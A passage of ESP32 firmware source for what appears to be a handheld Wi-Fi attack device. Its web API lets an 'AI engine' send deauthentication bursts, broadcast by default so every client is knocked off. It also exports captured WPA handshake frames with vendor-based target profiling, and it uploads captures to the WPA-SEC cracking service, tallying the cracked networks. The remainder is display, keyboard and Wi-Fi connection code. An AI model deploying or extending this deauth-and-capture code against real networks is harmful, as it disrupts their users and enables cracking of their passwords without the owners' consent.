    pushConsoleEventf("INFO", "AI", "inject_raw ch=%d len=%d err=%d", channel, pktLen, (int)txr);
    heap_caps_free(injectBuf);
    JsonDocument resp;
    resp["ok"]      = (txr == ESP_OK);
    resp["len"]     = pktLen;
    resp["channel"] = channel;
    resp["esp_err"] = (int)txr;
    String out;
    serializeJson(resp, out);
    webServer.send(txr == ESP_OK ? 200 : 500, "application/json", out);
  });

  // POST /api/ai/inject_deauth
  // Body (JSON): { "bssid":"AA:BB:CC:DD:EE:FF", "client":"FF:FF:FF:FF:FF:FF",
  //               "reason": 7, "count": 5, "channel": 6 }
  // AI chooses reason code and burst count based on vendor/chipset profile.
  // Omitting "client" defaults to broadcast (kicks all associated stations).
  webServer.on("/api/ai/inject_deauth", HTTP_POST, [](){
    if (!webServer.hasArg("plain")) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"no body\"}");
      return;
    }
    JsonDocument req;
    if (deserializeJson(req, webServer.arg("plain")) != DeserializationError::Ok) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid json\"}");
      return;
    }
    const char* bssidStr  = req["bssid"]   | "";
    const char* clientStr = req["client"]  | "FF:FF:FF:FF:FF:FF";
    uint8_t reason        = (uint8_t)(req["reason"] | 7);
    uint8_t count         = (uint8_t)(req["count"]  | 5);
    int     channel       = req["channel"] | 0;
    if (!bssidStr || !bssidStr[0]) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"missing bssid\"}");
      return;
    }
    uint8_t bssid[6], client[6];
    if (!macFromString(bssidStr, bssid)) {
      webServer.send(400, "application/json", "{\"ok\":false,\"error\":\"invalid bssid format\"}");
      return;
    }
    if (!macFromString(clientStr, client)) {
      memset(client, 0xFF, 6);  // fall back to broadcast
    }
    if (count < 1)  count = 1;
    if (count > 30) count = 30;   // safety cap — AI shouldn't need more
    if (channel >= 1 && channel <= 13) {
      esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
      delayMicroseconds(300);
    }
    WSLBypasser::sendDeauthBurst(bssid, client, count);
    Serial.printf("[ai] inject_deauth bssid=%s client=%s reason=%u count=%u ch=%d\n",
                  bssidStr, clientStr, reason, count, channel);
    pushConsoleEventf("INFO", "AI", "inject_deauth bssid=%.17s reason=%u count=%u",
                      bssidStr, reason, count);
    JsonDocument resp;
    resp["ok"]     = true;
    resp["bssid"]  = bssidStr;
    resp["client"] = clientStr;
    resp["reason"] = reason;
    resp["count"]  = count;
    String out;
    serializeJson(resp, out);
    webServer.send(200, "application/json", out);
  });

  // GET /api/ai/frames
  // Returns all captured EAPOL frames from the YOINK engine as hex strings,
  // plus OUI prefixes for both the AP and client so the Android AI engine can
  // do vendor lookups and build a TargetProfile without needing any extra data.
  webServer.on("/api/ai/frames", HTTP_GET, [](){
    JsonDocument doc;
    doc["ok"]      = true;
    doc["running"] = YoinkEngine::isRunning();
    doc["state"]   = YoinkEngine::getStateStr();

    // Current attack target (quick reference for the AI prompt builder)
    const uint8_t* tgtBssid = YoinkEngine::getTargetBSSID();
    const char*    tgtSsid  = YoinkEngine::getTargetSSID();
    if (tgtSsid && tgtSsid[0]) {
      JsonObject tgt = doc["target"].to<JsonObject>();
      tgt["ssid"] = tgtSsid;
      tgt["rssi"] = YoinkEngine::getTargetRSSI();
      tgt["auth"] = YoinkEngine::getTargetAuthStr();
      char bssidStr[18];
      snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               tgtBssid[0], tgtBssid[1], tgtBssid[2],
               tgtBssid[3], tgtBssid[4], tgtBssid[5]);
      tgt["bssid"] = bssidStr;
      // OUI prefix — Android looks this up in the IEEE MA-L database
      char ouiStr[9];
      snprintf(ouiStr, sizeof(ouiStr), "%02X:%02X:%02X",
               tgtBssid[0], tgtBssid[1], tgtBssid[2]);
      tgt["oui"] = ouiStr;
    }

    // All captured handshakes with per-frame EAPOL hex
    JsonArray hsArr = doc["handshakes"].to<JsonArray>();
    for (uint8_t i = 0; i < YoinkEngine::getTotalHandshakeSlots(); i++) {
      const YoinkHandshake* hs = YoinkEngine::getHandshake(i);
      if (!hs || hs->capturedMask == 0) continue;

      JsonObject ho = hsArr.add<JsonObject>();
      ho["ssid"]  = hs->ssid;
      ho["mask"]  = hs->capturedMask;
      ho["valid"] = hs->hasValidPair();
      ho["saved"] = hs->saved;

      char bStr[18], stStr[18];
      snprintf(bStr,  sizeof(bStr),  "%02X:%02X:%02X:%02X:%02X:%02X",
               hs->bssid[0],   hs->bssid[1],   hs->bssid[2],
               hs->bssid[3],   hs->bssid[4],   hs->bssid[5]);
      snprintf(stStr, sizeof(stStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               hs->station[0], hs->station[1], hs->station[2],
               hs->station[3], hs->station[4], hs->station[5]);
      ho["bssid"]   = bStr;
      ho["station"] = stStr;

      // OUI prefixes — first 3 bytes; Android resolves vendor from bundled IEEE CSV
      char apOui[9], staOui[9];
      snprintf(apOui,  sizeof(apOui),  "%02X:%02X:%02X",
               hs->bssid[0],   hs->bssid[1],   hs->bssid[2]);
      snprintf(staOui, sizeof(staOui), "%02X:%02X:%02X",
               hs->station[0], hs->station[1], hs->station[2]);
      ho["ap_oui"]  = apOui;
      ho["sta_oui"] = staOui;

      // Per-message EAPOL frames (M1-M4), hex-encoded
      JsonArray frArr = ho["frames"].to<JsonArray>();
      for (uint8_t m = 0; m < 4; m++) {
        if (!(hs->capturedMask & (1u << m))) continue;
        const YoinkEapolFrame& ef = hs->frames[m];
        if (ef.eapolLen == 0) continue;

        JsonObject fr = frArr.add<JsonObject>();
        fr["msg"]  = (int)(m + 1);
        fr["rssi"] = ef.rssi;
        fr["ts"]   = ef.timestamp;

        // EAPOL payload hex (cipher suite, MIC, nonce, replay counter all here)
        String eapolHex;
        eapolHex.reserve(ef.eapolLen * 2);
        for (uint16_t b = 0; b < ef.eapolLen; b++) {
          char nb[3];
          snprintf(nb, sizeof(nb), "%02X", ef.eapolData[b]);
          eapolHex += nb;
        }
        fr["eapol_hex"] = eapolHex;

        // Full 802.11 frame hex (includes addr1/2/3 for OUI cross-check)
        if (ef.fullFrameLen > 0) {
          String frameHex;
          frameHex.reserve(ef.fullFrameLen * 2);
          for (uint16_t b = 0; b < ef.fullFrameLen; b++) {
            char nb[3];
            snprintf(nb, sizeof(nb), "%02X", ef.fullFrame[b]);
            frameHex += nb;
          }
          fr["frame_hex"] = frameHex;
        }
      }
    }

    String out;
    serializeJson(doc, out);
    webServer.send(200, "application/json", out);
  });

  webServer.begin();
  Serial.printf("[web] WebServer started on port %d\n", webServerPort);
  wifiConnectStatus = "WebServer active: port " + String(webServerPort);
  pushConsoleEventf("INFO", "WEB", "Webserver started on %u", webServerPort);
}

static void stopWebServer() {
  if (!webServerRunning) {
    Serial.println("[web] WebServer already stopped");
    return;
  }
  Serial.println("[web] Stopping WebServer");
  webServer.stop();
  webServerRunning = false;
  wifiConnectStatus = "WebServer stopped";
  Serial.println("[web] WebServer stopped");
  pushConsoleEvent("INFO", "WEB", "Webserver stopped");
}

static inline int wifiConnectStatusLineY() {
  const int controlsY = hypercubeReservedBottomY + 12;
  const int rowH = 30;
  const int maxRows = 3;
  const int bottomY = controlsY + (maxRows * rowH) + 6;
  return bottomY + 22;
}

static void drawWifiConnect() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("WiFi Connect");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();
  // Selected network summary under title (left side of header area).
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  String selectedHeader = "Selected: (none)";
  if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) {
    const ApRecord& a = aps[wifiConnectSelectedIdx];
    selectedHeader = "Selected: " + (a.ssid.isEmpty() ? String("(hidden)") : a.ssid);
  }
  const int selectedHeaderMaxW = hypercubeBoxX - 12;
  if (selectedHeaderMaxW > 20) {
    while (selectedHeader.length() > 4 && tft.textWidth(selectedHeader) > selectedHeaderMaxW) {
      selectedHeader.remove(selectedHeader.length() - 1);
    }
    if (selectedHeader.length() > 4 && tft.textWidth(selectedHeader) > selectedHeaderMaxW) {
      selectedHeader = "Selected: ...";
    }
  }
  tft.drawString(selectedHeader, 8, 34);

  // Left control rail and list are moved down to open breathing room below header.
  const int controlsX = 10;
  const int controlsY = hypercubeReservedBottomY + 12;
  const int controlsW = 66;
  const int controlsH = 24;
  const int controlsGap = 8;

  btnWifiConnectBack = {controlsX, controlsY, controlsW, controlsH, "Back"};
  btnWifiConnectScan = {controlsX, controlsY + (controlsH + controlsGap), controlsW, controlsH, "Scan"};
  btnWifiConnectSubmit = {controlsX, controlsY + ((controlsH + controlsGap) * 2), controlsW, controlsH, "Connect"};
  btnWifiConnectDisconnect = {controlsX, controlsY + ((controlsH + controlsGap) * 3), controlsW, controlsH, "Disc"};
  drawButton(btnWifiConnectBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnectScan, TFT_DARKCYAN, TFT_MAGENTA, TFT_WHITE);
  drawButton(btnWifiConnectSubmit, TFT_DARKGREEN, TFT_MAGENTA, TFT_WHITE);
  int wifiStatus = WiFi.status();
  drawButton(btnWifiConnectDisconnect, wifiStatus == WL_CONNECTED ? TFT_MAROON : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  const int listX = controlsX + controlsW + 10;
  const int listTopY = controlsY;
  const int scrollX = w - 52;
  const int listW = scrollX - listX - 8;

  // Right scroll buttons
  btnWifiConnectUp   = {scrollX, listTopY, 42, 34, "^"};
  btnWifiConnectDown = {scrollX, listTopY + 38, 42, 34, "v"};
  drawButton(btnWifiConnectUp, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWifiConnectDown, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

  // Status line
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  char st[80];
  snprintf(st, sizeof(st), "Networks: %d  (tap to select)", apCount);
  tft.drawString(st, listX, listTopY - 12);

  // AP list area - 3 visible rows
  int wifiConnectListTopY = listTopY;
  int wifiConnectListBottomY = h - 50;
  int wifiConnectRowH = 30;
  const int maxRows = 3;

  for (int r = 0; r < maxRows; r++) {
    int idx = wifiConnectScroll + r;
    int y = wifiConnectListTopY + r * wifiConnectRowH;
    bool sel = (idx == wifiConnectSelectedIdx);
    
    if (idx < apCount) {
      // Draw AP row
      const ApRecord& a = aps[idx];
      
      uint16_t bgColor = sel ? TFT_DARKGREEN : TFT_BLACK;
      uint16_t borderColor = sel ? TFT_MAGENTA : TFT_DARKGREY;
      
      tft.fillRect(listX, y, listW, wifiConnectRowH - 2, bgColor);
      tft.drawRect(listX, y, listW, wifiConnectRowH - 2, borderColor);
      
      tft.setTextDatum(TL_DATUM);
      tft.setTextSize(1);
      tft.setTextColor(sel ? TFT_WHITE : TFT_CYAN, bgColor);
      
      char buf[80];
      snprintf(buf, sizeof(buf), "%s | CH%d | %s | %ddBm",
               a.ssid.isEmpty() ? "(hidden)" : a.ssid.c_str(),
               a.channel,
               authToStr(a.auth),
               a.rssi);
      tft.drawString(buf, listX + 2, y + 8);
      
      btnWifiConnectList[r] = {listX, y, listW, wifiConnectRowH - 2};
    } else {
      // Blank row
      tft.fillRect(listX, y, listW, wifiConnectRowH - 2, TFT_BLACK);
      tft.drawRect(listX, y, listW, wifiConnectRowH - 2, TFT_DARKGREY);
    }
  }

  // Bottom section: Selected AP info and status
  int bottomY = wifiConnectListTopY + (maxRows * wifiConnectRowH) + 6;
  tft.fillRect(0, bottomY, w, h - bottomY, TFT_BLACK);
  const int statusY = wifiConnectStatusLineY();
  
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  
  if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) {
    const ApRecord& a = aps[wifiConnectSelectedIdx];
    char buf[96];
    snprintf(buf, sizeof(buf), "Selected: %s | CH %d | %s | %ddBm",
             a.ssid.isEmpty() ? "(hidden)" : a.ssid.c_str(),
             a.channel,
             authToStr(a.auth),
             a.rssi);
    tft.drawString(buf, 8, bottomY + 6);
  } else {
    tft.drawString("Selected: (none)", 8, bottomY + 6);
  }

  // WiFi connection status
  tft.setTextColor(wifiConnectInProgress ? TFT_YELLOW : 
                   (wifiStatus == WL_CONNECTED) ? TFT_GREEN : TFT_CYAN,
                   TFT_BLACK);
  
  if (wifiStatus == WL_CONNECTED) {
    tft.drawString("Status: Connected - " + WiFi.localIP().toString(), 8, statusY);
  } else if (wifiConnectInProgress) {
    tft.drawString("Status: Connecting...", 8, statusY);
  } else {
    tft.drawString("Status: Not connected", 8, statusY);
  }

  if (wifiConnectShowPasswordModal) {
    const int boxX = 6;
    const int boxY = 46;
    const int boxW = w - 12;
    const int boxH = h - 52;
    const int keyW = 24;
    const int keyH = 22;
    const int keyGap = 2;
    const char* row1 = "1234567890";
    const char* row2 = "qwertyuiop";
    const char* row3 = "asdfghjkl";
    const char* row4 = "zxcvbnm";

    tft.fillRoundRect(boxX, boxY, boxW, boxH, 8, TFT_BLACK);
    tft.drawRoundRect(boxX, boxY, boxW, boxH, 8, TFT_MAGENTA);

    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Password Required", boxX + 10, boxY + 8);

    String ssid = "(none)";
    if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) ssid = aps[wifiConnectSelectedIdx].ssid;
    tft.drawString("SSID: " + ssid, boxX + 10, boxY + 22);

    String plain = wifiConnectPassword;
    if (plain.isEmpty()) plain = "(empty)";
    if (plain.length() > 32) plain = "..." + plain.substring(plain.length() - 32);
    tft.drawString("Pass: " + plain, boxX + 10, boxY + 36);

    wifiPwKeyCount = 0;
    auto addKey = [&](int x, int y, char baseChar) {
      if (wifiPwKeyCount >= 40) return;
      char outChar = baseChar;
      if (isalpha((unsigned char)baseChar)) {
        outChar = wifiPwShift ? (char)toupper(baseChar) : (char)tolower(baseChar);
      }
      wifiPwKeyValues[wifiPwKeyCount] = outChar;
      wifiPwKeyLabels[wifiPwKeyCount][0] = outChar;
      wifiPwKeyLabels[wifiPwKeyCount][1] = '\0';
      btnWifiPwKeys[wifiPwKeyCount] = {x, y, keyW, keyH, wifiPwKeyLabels[wifiPwKeyCount]};
      drawButton(btnWifiPwKeys[wifiPwKeyCount], TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
      wifiPwKeyCount++;
    };
    auto addRow = [&](const char* keys, int y) {
      int n = (int)strlen(keys);
      int totalW = (n * keyW) + ((n - 1) * keyGap);
      int x = (w - totalW) / 2;
      for (int i = 0; i < n; i++) addKey(x + i * (keyW + keyGap), y, keys[i]);
    };

    const int k0y = boxY + 56;
    addRow(row1, k0y);
    addRow(row2, k0y + keyH + keyGap);
    addRow(row3, k0y + ((keyH + keyGap) * 2));

    int row4y = k0y + ((keyH + keyGap) * 3);
    const int shiftW = 44;
    const int backW = 44;
    const int row4n = (int)strlen(row4);
    const int row4TotalW = shiftW + backW + (row4n * keyW) + ((row4n + 2) * keyGap);
    int row4x = (w - row4TotalW) / 2;
    btnWifiPwShift = {row4x, row4y, shiftW, keyH, wifiPwShift ? "SHIFT" : "shift"};
    drawButton(btnWifiPwShift, wifiPwShift ? TFT_NAVY : TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    int x = row4x + shiftW + keyGap;
    for (int i = 0; i < row4n; i++) addKey(x + i * (keyW + keyGap), row4y, row4[i]);
    btnWifiPwBack = {x + row4n * (keyW + keyGap), row4y, backW, keyH, "<-"};
    drawButton(btnWifiPwBack, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);

    const int row5y = row4y + keyH + keyGap;
    btnWifiPwSpace = {12, row5y, 110, keyH, "Space"};
    btnWifiPwClear = {124, row5y, 52, keyH, "Clear"};
    btnWifiPwCancel = {178, row5y, 64, keyH, "Cancel"};
    btnWifiPwConnect = {244, row5y, 64, keyH, "Connect"};
    drawButton(btnWifiPwSpace, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnWifiPwClear, TFT_DARKGREY, TFT_WHITE, TFT_WHITE);
    drawButton(btnWifiPwCancel,  TFT_MAROON, TFT_WHITE, TFT_WHITE);
    drawButton(btnWifiPwConnect, TFT_DARKGREEN, TFT_WHITE, TFT_WHITE);
  }

  drawBorder();
}

static void syncWithWPASec() {
  if (wpasecSyncInProgress) {
    Serial.println("[wpasec] Sync already in progress");
    return;
  }

  if (cfg.wpasec_apikey.isEmpty()) {
    wpasecSyncStatus = "API key not configured";
    Serial.println("[wpasec] Cannot sync: API key not set");
    return;
  }

  wpasecSyncInProgress = true;
  wpasecSyncStatus = "Syncing...";
  Serial.println("[wpasec] Starting sync with WPA-SEC");

  if (!mountSdCard(false)) {
    wpasecSyncStatus = "SD card not available";
    wpasecSyncInProgress = false;
    return;
  }

  // Load cache if not already loaded
  if (!WPASecClient::isBusy()) {
    Serial.println("[wpasec] Loading cache from SD/LittleFS");
    WPASecClient::loadCache(SD, "/wpasec_results.txt", "/wpasec_uploaded.txt");
  }

  // Sync captures from /captures first
  Serial.println("[wpasec] Scanning /captures directory");
  WPASecSyncResult result = WPASecClient::syncCaptures(
    SD,
    "/captures",
    "/wpasec_uploaded.txt",
    "/wpasec_results.txt",
    cfg.wpasec_apikey,
    [](const char* status, uint16_t progress, uint16_t total) {
      Serial.printf("[wpasec] %s (%u/%u)\n", status, progress, total);
    }
  );

  // YOINK handshakes are in /captures/<SSID>/Handshakes/ — covered by the /captures/ scan above.
  // The recursive scan already finds .pcap and .22000 files in all Handshakes subdirectories.

  // Update status
  if (result.success || result.uploaded > 0) {
    char summary[128];
    snprintf(summary, sizeof(summary), "Uploaded: %u, Cracked: %u", 
             result.uploaded, result.cracked);
    wpasecSyncStatus = summary;
    crackedNetworks = result.cracked;
    Serial.printf("[wpasec] Sync complete: %s\n", summary);
  } else {
    wpasecSyncStatus = "Sync failed";
    Serial.printf("[wpasec] Sync failed: %s\n", result.error);
  }

  wpasecSyncInProgress = false;
}

static void downloadWPASecResults() {
  if (cfg.wpasec_apikey.isEmpty()) {
    wpasecSyncStatus = "API key not configured";
    Serial.println("[wpasec] Cannot download: API key not set");
    return;
  }

  Serial.println("[wpasec] Downloading results from WPA-SEC");
  wpasecSyncStatus = "Downloading...";

  // The WPASecClient syncing process already downloads results
  // So we just trigger another full sync
  syncWithWPASec();
}

static void drawWebserver() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("Webserver & AP");
  drawUniversalBackground();

  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  int wifiStatus = WiFi.status();
  uint8_t apClients = WiFi.softAPgetStationNum();
  const int gap = 6;
  const int leftX = content.x;
  const int leftW = max(120, hypercubeBoxX - content.x - 6);

  // Hard bands: top status, middle detail, service row, bottom control row.
  // This prevents text from ever drawing over buttons.
  const int bottomBtnW = (bottom.w - (gap * 2)) / 3;
  const int serviceH = UI_BUTTON_H;
  const int serviceY = bottom.y - serviceH - 6;
  // Title text is drawn near y=8; keep status box top border ~10px below that title band.
  const int topStatusY = 34;
  const int topStatusH = 60;  // Uses the empty area under "Webserver & AP".
  const int detailsY = topStatusY + topStatusH + 4;
  const int detailsH = max(24, serviceY - detailsY - 4);

  btnWebserverBack = {bottom.x, bottom.y, bottomBtnW, UI_BUTTON_H, "Back"};
  btnWebserverStartAP = {bottom.x + bottomBtnW + gap, bottom.y, bottomBtnW, UI_BUTTON_H, apMode ? "Stop AP" : "Start AP"};
  btnWebserverStartServer = {bottom.x + (bottomBtnW + gap) * 2, bottom.y, bottomBtnW, UI_BUTTON_H,
                             webServerRunning ? "Stop Web" : "Start Web"};

  const int serviceW = (leftW - gap) / 2;
  btnWebserverWpaSecSync = {leftX, serviceY, serviceW, serviceH, "Sync WPA-SEC"};
  btnWebserverDownloadResults = {leftX + serviceW + gap, serviceY, serviceW, serviceH, "Get Results"};

  drawButton(btnWebserverBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverStartAP, apMode ? TFT_MAROON : TFT_DARKGREEN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverStartServer, webServerRunning ? TFT_MAROON : TFT_DARKGREEN, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverWpaSecSync, wpasecSyncInProgress ? TFT_DARKGREY : TFT_BLUE, TFT_WHITE, TFT_WHITE);
  drawButton(btnWebserverDownloadResults, TFT_DARKCYAN, TFT_WHITE, TFT_WHITE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);

  // Top status window (requested position under title text).
  tft.drawRoundRect(leftX, topStatusY, leftW, topStatusH, 5, TFT_DARKGREY);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("STATUS", leftX + 4, topStatusY + 3);

  auto trimToWidth = [&](String s, int maxW) -> String {
    while (s.length() > 4 && tft.textWidth(s) > maxW) s.remove(s.length() - 1);
    return s;
  };

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String staLine = (wifiStatus == WL_CONNECTED) ? ("STA: Connected  " + WiFi.SSID()) : String("STA: Not connected");
  staLine = trimToWidth(staLine, leftW - 10);
  tft.drawString(staLine, leftX + 4, topStatusY + 17);

  String apLine = String("AP: ") + (apMode ? "Active" : "Inactive") + "  Clients:" + String(apClients);
  apLine = trimToWidth(apLine, leftW - 10);
  tft.drawString(apLine, leftX + 4, topStatusY + 29);

  String staIpLine = String("STA IP: ") + ((wifiStatus == WL_CONNECTED) ? WiFi.localIP().toString() : String("-"));
  staIpLine = trimToWidth(staIpLine, leftW - 10);
  tft.drawString(staIpLine, leftX + 4, topStatusY + 41);

  // Middle left details panel.
  tft.drawRect(leftX, detailsY, leftW, detailsH, TFT_DARKGREY);
  int rowY = detailsY + 4;
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.drawString(webServerRunning ? "Web: ONLINE" : "Web: OFFLINE", leftX + 4, rowY);
  rowY += 11;
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  String accessUrl = "-";
  if (webServerRunning) {
    if (wifiStatus == WL_CONNECTED) accessUrl = "http://" + WiFi.localIP().toString() + ":8080";
    else if (apMode) accessUrl = "http://192.168.4.1:8080";
  }
  accessUrl = trimToWidth(accessUrl, leftW - 10);
  tft.drawString(accessUrl, leftX + 4, rowY);
  rowY += 11;
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  String syncState = wpasecSyncInProgress ? "WPA-SEC: Syncing..." : ("WPA-SEC: " + (wpasecSyncStatus.isEmpty() ? String("Idle") : wpasecSyncStatus));
  syncState = trimToWidth(syncState, leftW - 10);
  tft.drawString(syncState, leftX + 4, rowY);

  // Right-side utility panel (uses free space marked in photo).
  const int rightX = hypercubeBoxX + 2;
  const int rightW = max(48, (content.x + content.w) - rightX);
  const int rightY = topStatusY + topStatusH + 4;
  const int rightH = max(20, serviceY - rightY - 4);
  if (rightW > 40 && rightH > 16) {
    tft.drawRect(rightX, rightY, rightW, rightH, TFT_DARKGREY);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("AP", rightX + 3, rightY + 3);
    if (apMode && apClients > 0) {
      wifi_sta_list_t staList;
      if (esp_wifi_ap_get_sta_list(&staList) == ESP_OK && staList.num > 0) {
        char mac[24];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 staList.sta[0].mac[0], staList.sta[0].mac[1], staList.sta[0].mac[2],
                 staList.sta[0].mac[3], staList.sta[0].mac[4], staList.sta[0].mac[5]);
        String macLine = trimToWidth(String(mac), rightW - 6);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(macLine, rightX + 3, rightY + 14);
      }
    } else {
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.drawString("No clients", rightX + 3, rightY + 14);
    }
  }

  uiLogLayout("drawWebserver", content, bottom);
  uiLogButtonRect("Web.Back", btnWebserverBack);
  uiLogButtonRect("Web.AP", btnWebserverStartAP);
  uiLogButtonRect("Web.Toggle", btnWebserverStartServer);
  uiLogButtonRect("Web.Sync", btnWebserverWpaSecSync);
  uiLogButtonRect("Web.Results", btnWebserverDownloadResults);
  drawBorder();
}

// Dynamic status line Y on WIFI_CONNECT (derived from current layout).

static void refreshWifiStatusLine() {
  if (screen != ScreenId::WIFI_CONNECT) return;
  const int w = tft.width();
  const int statusY = wifiConnectStatusLineY();
  // Clear status line area
  tft.fillRect(0, statusY - 2, w, 18, TFT_BLACK);
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  int ws = WiFi.status();
  if (ws == WL_CONNECTED) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("Status: Connected  " + WiFi.localIP().toString(), 8, statusY);
  } else if (wifiConnectInProgress) {
    uint32_t elapsed = (millis() - wifiConnectAttemptMs) / 1000;
    char buf[64];
    snprintf(buf, sizeof(buf), "Status: Connecting... %lus", elapsed);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(buf, 8, statusY);
  } else {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Status: " + wifiConnectStatus, 8, statusY);
  }
}

static void updateWifiConnectStatus() {
  wifiConnectTick(
    screen == ScreenId::WIFI_CONNECT,
    wifiConnectInProgress,
    wifiConnectStatus,
    wifiConnectAttemptMs,
    wifiConnectSsid,
    wifiConnectPassword,
    cfg,
    drawWifiConnect,
    refreshWifiStatusLine,
    pushConsoleEventf
  );
}

static void wifiConnectScanTick() {
  if (!wifiConnectScanActive) return;

  int poll = pollWifiScanAsync();
  if (poll == 0) {
    if (millis() - wifiConnectScanStartedMs > 30000) {
      wifiConnectScanActive = false;
      wifiIsScanning = false;
      WiFi.scanDelete();
      wifiConnectStatus = "Scan timeout";
      Serial.println("[wifi] async scan timeout");
      if (screen == ScreenId::WIFI_CONNECT) drawWifiConnect();
    }
    return;
  }

  wifiConnectScanActive = false;
  if (poll > 0) {
    wifiConnectStatus = "Scan complete: " + String(apCount) + " APs";
    Serial.printf("[wifi] async scan complete: %d networks\n", apCount);
  } else {
    wifiConnectStatus = "Scan failed";
    Serial.println("[wifi] async scan failed");
  }
  if (screen == ScreenId::WIFI_CONNECT) drawWifiConnect();
}

static void monitorPushLine(uint16_t color, const char* fmt, ...) {
  char buf[80];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);

  if (monitorLineCount < MONITOR_MAX_LINES) {
    strncpy(monitorLines[monitorLineCount].text, buf, sizeof(monitorLines[monitorLineCount].text) - 1);
    monitorLines[monitorLineCount].text[sizeof(monitorLines[monitorLineCount].text) - 1] = '\0';
    monitorLines[monitorLineCount].color = color;
    monitorLineCount++;
    return;
  }

  for (int i = 1; i < MONITOR_MAX_LINES; i++) {
    monitorLines[i - 1] = monitorLines[i];
  }
  strncpy(monitorLines[MONITOR_MAX_LINES - 1].text, buf, sizeof(monitorLines[MONITOR_MAX_LINES - 1].text) - 1);
  monitorLines[MONITOR_MAX_LINES - 1].text[sizeof(monitorLines[MONITOR_MAX_LINES - 1].text) - 1] = '\0';
  monitorLines[MONITOR_MAX_LINES - 1].color = color;
}

// Update a specific line in place without scrolling (for Raw mode)
static void monitorUpdateLine(int lineIdx, uint16_t color, const char* fmt, ...) {
  if (lineIdx < 0 || lineIdx >= MONITOR_MAX_LINES) return;
  
  char buf[80];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  
  strncpy(monitorLines[lineIdx].text, buf, sizeof(monitorLines[lineIdx].text) - 1);
  monitorLines[lineIdx].text[sizeof(monitorLines[lineIdx].text) - 1] = '\0';
  monitorLines[lineIdx].color = color;
  
  // Ensure we track this line as visible
  if (lineIdx >= monitorLineCount) {
    monitorLineCount = lineIdx + 1;
  }
}

static const char* monitorPktTypeStr(uint8_t t) {
  if (t == WIFI_PKT_MGMT) return "MGMT";
  if (t == WIFI_PKT_CTRL) return "CTRL";
  if (t == WIFI_PKT_DATA) return "DATA";
  return "UNK";
}

static bool monitorNameEndsWithIgnoreCase(const char* name, const char* suffix) {
  if (!name || !suffix) return false;
  size_t nLen = strlen(name);
  size_t sLen = strlen(suffix);
  if (nLen < sLen) return false;
  for (size_t i = 0; i < sLen; i++) {
    char a = name[nLen - sLen + i];
    char b = suffix[i];
    if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
    if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
    if (a != b) return false;
  }
  return true;
}

static bool monitorAllowFileName(const char* name) {
  return monitorNameEndsWithIgnoreCase(name, ".pcap") ||
         monitorNameEndsWithIgnoreCase(name, ".pcapng") ||
         monitorNameEndsWithIgnoreCase(name, ".log") ||
         monitorNameEndsWithIgnoreCase(name, ".txt");
}

static void monitorSetFileInfo(const char* txt) {
  strncpy(monitorFileInfo, txt ? txt : "", sizeof(monitorFileInfo) - 1);
  monitorFileInfo[sizeof(monitorFileInfo) - 1] = '\0';
}

static void monitorLoadFileDir(const char* path) {
  monitorFileCount = 0;
  if (!path || !path[0]) path = "/";
  if (!sdReady && !mountSdCard(false)) {
    monitorSetFileInfo("SD not ready");
    return;
  }

  strncpy(monitorFilePath, path, sizeof(monitorFilePath) - 1);
  monitorFilePath[sizeof(monitorFilePath) - 1] = '\0';

  File dir = SD.open(monitorFilePath);
